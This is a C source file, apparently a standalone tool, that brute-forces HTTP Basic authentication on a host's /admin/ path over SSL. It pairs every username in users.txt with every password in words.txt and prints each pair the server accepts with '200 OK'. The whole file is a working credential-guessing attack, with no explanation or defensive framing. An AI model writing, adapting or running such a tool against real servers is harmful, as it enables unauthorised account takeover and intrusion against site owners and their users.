#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define USER "users.txt"
#define PASS "words.txt"
#define CATALOG "/admin/"

static char table64[]=
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char *port_host;
char *name;

void token(char *arg)
{
  name = strtok(arg, ":");
  port_host = strtok(NULL, "");
  
  if (port_host == NULL)
    port_host = "443";
}

void base64Encode(char *intext, char *output)
{
  unsigned char ibuf[3];
  unsigned char obuf[4];
  int i;
  int inputparts;

  while(*intext) {
    for (i = inputparts = 0; i < 3; i++) { 
      if(*intext) {
        inputparts++;
        ibuf[i] = *intext;
        intext++;
      }
      else
        ibuf[i] = 0;
    }
                       
    obuf [0] = (ibuf [0] & 0xFC) >> 2;
    obuf [1] = ((ibuf [0] & 0x03) << 4) | ((ibuf [1] & 0xF0) >> 4);
    obuf [2] = ((ibuf [1] & 0x0F) << 2) | ((ibuf [2] & 0xC0) >> 6);
    obuf [3] = ibuf [2] & 0x3F;

    switch(inputparts) {
    case 1: /* only one byte read */
      sprintf(output, "%c%c==", 
              table64[obuf[0]],
              table64[obuf[1]]);
      break;
    case 2: /* two bytes read */
      sprintf(output, "%c%c%c=", 
              table64[obuf[0]],
              table64[obuf[1]],
              table64[obuf[2]]);
      break;
    default:
      sprintf(output, "%c%c%c%c", 
              table64[obuf[0]],
              table64[obuf[1]],
              table64[obuf[2]],
              table64[obuf[3]] );
      break;
    }
    output += 4;
  }
  *output=0;
}

int main(int argc, char **argv)
{
  FILE *fd1, *fd2;
  int sd, bytes;
  char buf1[250], buf2[250];
  char buf[250];
  char str1[270], str2[100];
  struct hostent* host;
  struct sockaddr_in servaddr;
  char rez[2000];
  char c[600];
  
  SSL_METHOD *method;
  SSL_CTX *ctx;
  SSL *ssl;
  OpenSSL_add_all_algorithms();
  SSL_load_error_strings();
  
  method = SSLv2_client_method();
  ctx = SSL_CTX_new(method);

  if (argc != 2) {
    fprintf(stderr, "Usage: %s host[:port]\n\n", argv[0]);
    exit(-1);
  }

  token(argv[1]); 

  if ( (host = gethostbyname(name)) == NULL) {
    herror("gethostbyname() failed");
    exit(-1);
  }

  bzero(&servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = htons(atoi(port_host));
  servaddr.sin_addr = *((struct in_addr *)host->h_addr);

  if ( (fd1 = fopen(USER, "r")) == NULL) {
    perror("fopen() failed");
    exit(-1);
  }

  while(fgets(buf1, 250, fd1) != NULL)
  {
    buf1[strcspn(buf1, "\r\n\t")] = 0;
    if (strlen(buf1) == 0) continue;

    if( (fd2 = fopen(PASS, "r")) == NULL) {
      perror("fopen() failed");
      exit(-1);
    }

    while(fgets(buf2, 250, fd2) != NULL)
    {
      buf2[strcspn(buf2, "\r\n\t")] = 0;
      if (strlen(buf2) == 0) continue;

      sprintf(c, "%s:%s", buf1, buf2);
      base64Encode(c, rez);

      if ( (sd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
	perror("socket() failed");
	exit(-1);
      }
        
      if (connect(sd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1) {
	perror("connect() failed");
	exit(-1);
      }

      ssl = SSL_new(ctx);
      SSL_set_fd(ssl, sd);
      if (SSL_connect(ssl) == -1)
        ERR_print_errors_fp(stderr);

      sprintf(str1, "GET %s HTTP/1.1\r\n", CATALOG);
      sprintf(str2, "Host:%s\r\nAuthorization: Basic %s\r\n\r\n", argv[1], rez);

      SSL_write(ssl, str1, strlen(str1));
      SSL_write(ssl, str2, strlen(str2));

      bzero(buf, 250);
    
      bytes = SSL_read(ssl, buf, sizeof(buf)-1);
      buf[bytes] = 0;

      if (strstr(buf, "200 OK") != NULL) {
        printf("======================================\n");
        printf("%s", str1);     
        printf("%s\n", str2);
	printf("Result OK: %s\n", c);
        printf("======================================\n");
      }
    
      close(sd); 
      SSL_free(ssl);
    }
  }
  
  SSL_CTX_free(ctx);
  return 0;
}
